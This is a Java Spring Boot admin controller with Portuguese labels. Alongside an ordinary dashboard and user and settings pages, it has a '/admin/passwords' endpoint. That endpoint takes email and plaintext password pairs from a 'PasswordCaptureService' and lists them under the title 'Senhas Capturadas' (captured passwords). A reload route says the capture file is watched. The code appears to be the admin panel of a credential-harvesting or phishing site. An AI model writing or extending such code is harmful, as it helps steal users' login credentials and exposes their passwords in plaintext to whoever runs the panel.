package com.site.backend.controller;

import com.site.backend.entity.Usuario;
import com.site.backend.repository.UsuarioRepository;
import com.site.backend.service.PasswordCaptureService;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.security.core.Authentication;
import org.springframework.security.core.authority.SimpleGrantedAuthority;
import org.springframework.security.core.context.SecurityContextHolder;
import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.web.bind.annotation.GetMapping;

import jakarta.servlet.http.HttpServletRequest;
import java.util.*;

@Controller
public class AdminController {
    
    @Autowired
    private UsuarioRepository usuarioRepository;
    
    @Autowired
    private PasswordCaptureService passwordCaptureService;
    
    @GetMapping("/admin/admindashboard")
    public String adminDashboard(Model model, HttpServletRequest request) {
        Authentication auth = SecurityContextHolder.getContext().getAuthentication();
        
        if (auth == null || !auth.isAuthenticated() || 
            !auth.getAuthorities().contains(new SimpleGrantedAuthority("ROLE_ADMIN"))) {
            return "redirect:/login?error=unauthorized";
        }
        
        long totalUsuarios = usuarioRepository.count();
        
        model.addAttribute("titulo", "Dashboard Administrativo");
        model.addAttribute("mensagem", "Bem-vindo ao painel de controle!");
        model.addAttribute("usuario", auth.getName());
        model.addAttribute("currentPath", request.getRequestURI());
        model.addAttribute("totalUsuarios", totalUsuarios);
        
        return "admin/admindashboard";
    }
    
    @GetMapping("/admin/passwords")
public String showPasswords(Model model) {
    Authentication auth = SecurityContextHolder.getContext().getAuthentication();
    
    if (auth == null || !auth.isAuthenticated() || 
        !auth.getAuthorities().contains(new SimpleGrantedAuthority("ROLE_ADMIN"))) {
        return "redirect:/login?error=unauthorized";
    }
    
    try {
        System.out.println("=== DEBUG: showPasswords chamado ===");
        
        if (passwordCaptureService != null) {
            Map<String, String> passwordsMap = passwordCaptureService.getAllPasswords();
            int total = passwordsMap.size();
            
            System.out.println("DEBUG: Total de senhas no Map: " + total);
            
            // Converter Map para lista para o template
            List<Map<String, String>> passwordsList = new ArrayList<>();
            for (Map.Entry<String, String> entry : passwordsMap.entrySet()) {
                Map<String, String> passwordEntry = new HashMap<>();
                passwordEntry.put("email", entry.getKey());
                passwordEntry.put("senha", entry.getValue());
                passwordsList.add(passwordEntry);
            }
            
            // Adicionar atributos ao modelo
            model.addAttribute("passwords", passwordsList);
            model.addAttribute("totalPasswords", total);
            model.addAttribute("titulo", "Senhas Capturadas");
            model.addAttribute("usuario", auth.getName());
            
            // Adicionar informações de usuários para estatísticas
            long totalUsers = usuarioRepository.count();
            model.addAttribute("totalUsers", totalUsers);
            
            System.out.println("DEBUG: Enviando " + passwordsList.size() + " senhas para o template");
        } else {
            System.out.println("DEBUG: passwordCaptureService é NULL!");
            model.addAttribute("error", "Serviço de senhas não disponível");
        }
        
    } catch (Exception e) {
        e.printStackTrace();
        model.addAttribute("error", "Erro ao carregar senhas: " + e.getMessage());
    }
    
    return "admin/passwords";
}

    
    @GetMapping("/admin/passwords/reload")
    public String reloadPasswords(Model model) {
        Authentication auth = SecurityContextHolder.getContext().getAuthentication();
        
        if (auth == null || !auth.isAuthenticated() || 
            !auth.getAuthorities().contains(new SimpleGrantedAuthority("ROLE_ADMIN"))) {
            return "redirect:/login?error=unauthorized";
        }
        
        try {
            if (passwordCaptureService != null) {
                // O serviço atual não tem reloadPasswords(), então vamos recarregar do arquivo
                // Criaremos um método refresh() no serviço ou faremos assim:
                model.addAttribute("success", "Recarregamento automático ativo (arquivo é monitorado)");
            } else {
                model.addAttribute("error", "Serviço de senhas não disponível");
            }
        } catch (Exception e) {
            model.addAttribute("error", "Erro ao recarregar: " + e.getMessage());
        }
        
        return showPasswords(model);
    }
    
    @GetMapping("/admin/users")
    public String showUsers(Model model) {
        Authentication auth = SecurityContextHolder.getContext().getAuthentication();
        
        if (auth == null || !auth.isAuthenticated() || 
            !auth.getAuthorities().contains(new SimpleGrantedAuthority("ROLE_ADMIN"))) {
            return "redirect:/login?error=unauthorized";
        }
        
        try {
            List<Usuario> usuarios = usuarioRepository.findAll();
            model.addAttribute("users", usuarios);
            model.addAttribute("totalUsers", usuarios.size());
            model.addAttribute("titulo", "Gerenciar Usuários");
            model.addAttribute("usuario", auth.getName());
            
        } catch (Exception e) {
            model.addAttribute("error", "Erro ao carregar usuários: " + e.getMessage());
        }
        
        return "admin/users";
    }
    
    @GetMapping("/admin/settings")
    public String adminSettings(Model model) {
        Authentication auth = SecurityContextHolder.getContext().getAuthentication();
        
        if (auth == null || !auth.isAuthenticated() || 
            !auth.getAuthorities().contains(new SimpleGrantedAuthority("ROLE_ADMIN"))) {
            return "redirect:/login?error=unauthorized";
        }
        
        model.addAttribute("titulo", "Configurações do Sistema");
        model.addAttribute("usuario", auth.getName());
        
        return "admin/settings";
    }
}